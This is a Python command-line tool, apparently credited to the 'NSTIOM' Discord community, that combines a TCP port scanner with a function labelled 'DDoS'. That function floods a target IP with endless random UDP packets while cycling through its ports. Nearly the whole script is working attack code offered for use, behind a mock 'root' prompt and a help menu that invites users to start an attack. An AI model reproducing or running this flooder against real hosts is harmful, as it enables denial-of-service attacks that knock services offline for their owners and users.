import sys, os, time, argparse, socket, re, random
from colorama import init, Fore, Back, Style
init(autoreset=True)

os.system('cls')

ascii = f"""
{Fore.CYAN}  ███╗░░██╗░██████╗████████╗██╗░█████╗░███╗░░░███╗
{Fore.CYAN}  ████╗░██║██╔════╝╚══██╔══╝██║██╔══██╗████╗░████║
{Fore.CYAN}  ██╔██╗██║╚█████╗░░░░██║░░░██║██║░░██║██╔████╔██║
{Fore.CYAN}  ██║╚████║░╚═══██╗░░░██║░░░██║██║░░██║██║╚██╔╝██║
{Fore.CYAN}  ██║░╚███║██████╔╝░░░██║░░░██║╚█████╔╝██║░╚═╝░██║
{Fore.CYAN}  ╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░░░░╚═╝
"""

# หากคุณต้องการให้ข้อความขึ้นกลางจอ
columns = os.get_terminal_size().columns
for line in ascii.splitlines():
    print(line.center(columns))

# ตัวอย่างเพิ่มเติม
print(Fore.RED + "\n[!]เครดิต DISCORD NSTIOM COMMUNITY.\n".center(columns))


def scan_ports(ip):
    for port in range(1, 65536):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if not s.connect_ex((ip, port)):
            print(f'IP: {ip}, port {port} is open')
        s.close()

def scan_ip(ip):
    print(f'Scanning IP: {ip}')
    scan_ports(ip)

def ddos_attack(ip, port):
    print("Starting the DDoS attack on", ip, "at port", port, "...")
    time.sleep(5)
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

def display_help():
    print('Available commands:')
    print('- scanport [1/2] [IP]: Scan ports on the specified IP address.')
    print('- scanip [url]: Scan IP address corresponding to the URL.')
    print('- DDos [IP] [Port]: Initiate a DDoS attack on the specified IP and Port.')
    print('- clear: Clear message in console.')
    print('- help: Display this help message.')
    print('- exit: Exit the program.')

def main():
    while True:
        try:
            input_text = input("root@root:~ $ ")
            if input_text.startswith('scanport '):
                mode, ip = re.findall(r'scanport\s+([12])\s+([\d.]+)', input_text)[0]
                if mode == '1':
                    scan_ports(ip)
                else:
                    common_ports = [20, 21, 22, 23, 53, 80, 161, 162, 443, 1234, 3389, 8080, 8086, 8888]
                    for port in common_ports:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        if not s.connect_ex((ip, port)):
                            print(f'IP: {ip}, port {port} is open')
                        s.close()
            elif input_text.startswith('scanip '):
                url = re.findall(r'scanip\s+(.*?)$', input_text)[0]
                try:
                    ip = socket.gethostbyname(url)
                    scan_ip(ip)
                except socket.gaierror:
                    print(f"Unable to resolve the host '{url}' to an IP address.")
            elif input_text.startswith('DDos '):
                _, ip, port = input_text.split()
                ddos_attack(ip, int(port))
            elif input_text == 'help':
                display_help()
            elif input_text == 'clear':
                os.system('cls')
                columns = os.get_terminal_size().columns
                for line in ascii.splitlines():
                    print(line.center(columns))
                print(Fore.RED + "\n[!]เครดิต DISCORD NSTIOM COMMUNITY.".center(columns))
            elif input_text == 'exit':
                os.system('cls')
                break
            else:
                print(f"'{input_text}' is not recognized as an internal or external command. Type 'help' to see the commands.")
        except KeyboardInterrupt:
            os.system('cls')
            columns = os.get_terminal_size().columns
            for line in ascii.splitlines():
                print(line.center(columns))
            print(Fore.RED + "\n[!]เครดิต DISCORD NSTIOM COMMUNITY.".center(columns))

if __name__ == "__main__":
    main()
